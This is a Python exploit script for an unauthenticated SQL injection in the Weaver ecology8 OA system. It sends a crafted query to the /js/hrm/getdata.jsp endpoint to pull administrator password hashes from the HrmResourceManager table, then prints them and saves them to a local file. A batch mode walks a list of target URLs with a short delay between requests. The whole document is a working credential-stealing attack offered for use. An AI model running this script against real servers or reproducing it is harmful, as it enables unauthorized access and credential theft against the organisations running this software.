#!/usr/bin/python
# Env: python3
# Author: afei00123
# -*- coding: utf8 -*-

import requests, urllib3, time, argparse
from colorama import init
init(autoreset=True)

def title():
    print("")
    print('*'.center(60, '*'))
    print("Version：ecology8".center(40))
    print("github：https://github.com/ltfafei".center(50))
    print("gitee：https://gitee.com/afei00123".center(50))
    print("CSDN: afei00123.blog.csdn.net".center(50))
    print("公众号：网络运维渗透".center(50))
    print("")
    print('*'.center(60, '*'))
    print("")

class ecology8_front_desk_SQLi_EXP():
    def ecology8_SQLi_EXP(self, url):
        target_url = f"{url}/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=Select password as id from HrmResourceManager"
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        try:
            respon_data = requests.get(target_url, timeout=3).text.strip()
            print(f"\033[31m{url}密码hash：{respon_data}")
            with open("res_pass.txt", 'a') as f:
                 f.writelines(f"{url}密码hash：{respon_data}" + "\n")
        except Exception:
            print(f"{url}请求失败，请检查网络是否可达！")
            return url

    def ecology8_SQLi_Batch_EXP(self, url, file):
        if url:
            return True
        elif file:
            for url in file:
                url = url.replace('\n', '')
                time.sleep(1)
                self.ecology8_SQLi_EXP(url)

if(__name__ == "__main__"):
    title()
    parser = argparse.ArgumentParser(description="ecology8_front_desk_SQLi_EXP Script")
    parser.add_argument(
        '-u', '--url', type=str,
        help='Please input target url. eg: https://ip:port'
    )
    parser.add_argument(
        '-f', '--file', type=argparse.FileType('r'),
        help='Please input urls file path. eg: c:\\urls.txt'
    )
    args = parser.parse_args()
    run_POC = ecology8_front_desk_SQLi_EXP()
    if args.file:
        run_POC.ecology8_SQLi_Batch_EXP(args.url, args.file)
        print("\n[done] 密码hash批量获取完成，请查看：res_pass.txt")
    if args.url:
        run_POC.ecology8_SQLi_EXP(args.url)